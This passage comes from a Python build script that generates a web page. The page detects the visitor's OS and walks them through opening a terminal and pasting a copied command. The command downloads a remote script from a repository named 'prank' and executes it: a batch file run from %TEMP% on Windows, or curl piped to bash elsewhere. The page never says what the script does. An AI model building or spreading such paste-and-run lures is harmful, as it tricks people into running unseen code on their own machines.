  const mobileTerminal = document.getElementById("mobile-terminal");
  if (mobileTerminal) mobileTerminal.style.display = "none";
  desktopContainer.style.display = "block";

  const WIN_CMD = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\launch.bat" && "%TEMP%\\launch.bat"';
  const UNIX_CMD = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.sh | bash';

  const tabWin = document.getElementById("tab-win");
  const tabUnix = document.getElementById("tab-unix");
  const cmdDisplay = document.getElementById("cmd-display");
  const cmdHint = document.getElementById("cmd-hint");
  const copyBtn = document.getElementById("btn-copy");

  let currentCmd = WIN_CMD;

  function setTab(os) {{
    if (os === "unix") {{
      tabUnix.classList.add("active");
      tabWin.classList.remove("active");
      currentCmd = UNIX_CMD;
      cmdDisplay.textContent = UNIX_CMD;
      cmdHint.innerHTML = '&gt; <b>Step 1:</b> Open <b>Terminal</b> (Cmd + Space &rarr; Terminal on Mac, or Ctrl + Alt + T on Linux).<br>&gt; <b>Step 2:</b> Paste the command and press <b>Enter</b>.';
    }} else {{
      tabWin.classList.add("active");
      tabUnix.classList.remove("active");
      currentCmd = WIN_CMD;
      cmdDisplay.textContent = 'curl -sSL https://raw.githubusercontent.com/pmkaulani/prank/main/launch.bat -o "%TEMP%\\launch.bat" && "%TEMP%\\launch.bat"';
      cmdHint.innerHTML = '&gt; <b>Step 1:</b> Press <b>Win + R</b>, type <b>cmd</b>, and press <b>Enter</b>.<br>&gt; <b>Step 2:</b> Paste the command and press <b>Enter</b>.';
    }}
  }}

  tabWin.addEventListener("click", () => {{
    setTab("win");
  }});

  tabUnix.addEventListener("click", () => {{
    setTab("unix");
  }});

  // Auto-detect Mac / Linux
  const plat = navigator.platform || '';
  const ua = navigator.userAgent || '';
  if (/Macintosh|MacIntel|Linux/i.test(plat) || /Mac OS|Linux/i.test(ua)) {{
    setTab("unix");
  }} else {{
    setTab("win");
  }}

  copyBtn.addEventListener("click", () => {{
    const textToCopy = currentCmd;
    if (navigator.clipboard && navigator.clipboard.writeText) {{
      navigator.clipboard.writeText(textToCopy).then(() => {{
        copyBtn.textContent = "[ COPIED TO CLIPBOARD! ]";
        copyBtn.style.background = "#00e650";
        copyBtn.style.color = "#040608";
        setTimeout(() => {{
          copyBtn.textContent = "> CLICK TO COPY COMMAND";
          copyBtn.style.background = "#0f1c14";
          copyBtn.style.color = "#00e650";
        }}, 2500);
      }});
    }} else {{
      const ta = document.createElement("textarea");
      ta.value = textToCopy;
      document.body.appendChild(ta);
      ta.select();
      document.execCommand("copy");
      document.body.removeChild(ta);
      copyBtn.textContent = "[ COPIED TO CLIPBOARD! ]";
      copyBtn.style.background = "#00e650";
      copyBtn.style.color = "#040608";
      setTimeout(() => {{
        copyBtn.textContent = "> CLICK TO COPY COMMAND";
        copyBtn.style.background = "#0f1c14";
        copyBtn.style.color = "#00e650";
      }}, 2500);
    }}
  }});
}}

/* ==========================================================================
   INITIALIZATION ROUTER
   ========================================================================== */
function runRouter() {{
  const device = detectDevice();
  console.log("Device detection result:", device);

  if (device === "iphone") {{
    runMobileTerminal(IPHONE_SCRIPT, "iphone");
  }} else if (device === "ipad") {{
    runMobileTerminal(IPAD_SCRIPT, "ipad");
  }} else if (device === "android-phone") {{
    runMobileTerminal(ANDROID_PHONE_SCRIPT, "android");
  }} else if (device === "android-tablet") {{
    runMobileTerminal(ANDROID_TABLET_SCRIPT, "android-tablet");
  }} else {{
    initDesktop();
  }}
}}

if (document.readyState === "loading") {{
  document.addEventListener("DOMContentLoaded", runRouter);
}} else {{
  runRouter();
}}
</script>
</body>
</html>
"""

    with open("index.html", "w", encoding="utf-8") as f:
        f.write(html_content)

    size_kb = os.path.getsize("index.html") / 1024
    print(f"Successfully generated index.html ({size_kb:.1f} KB)")

if __name__ == "__main__":
    build()
